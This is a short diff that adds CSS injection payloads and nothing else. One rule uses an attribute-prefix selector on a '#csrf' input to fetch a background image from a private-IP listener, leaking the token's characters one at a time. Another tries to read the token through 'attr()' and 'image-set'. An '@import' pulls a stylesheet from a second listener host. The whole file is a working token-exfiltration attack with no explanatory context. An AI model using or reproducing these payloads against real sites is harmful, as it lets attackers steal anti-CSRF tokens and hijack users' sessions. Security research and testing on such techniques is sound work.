@@ -1,0 +1,6 @@
+<style>#csrf[value^=a]{background: url("http://192.168.101.21:8888/?x=a");}</style>
+<style>#csrf{--steal:attr(value);background: image-set(var(--steal));}</style>
+
+
+@import "http://192.168.1.67:9999/style.css"
+
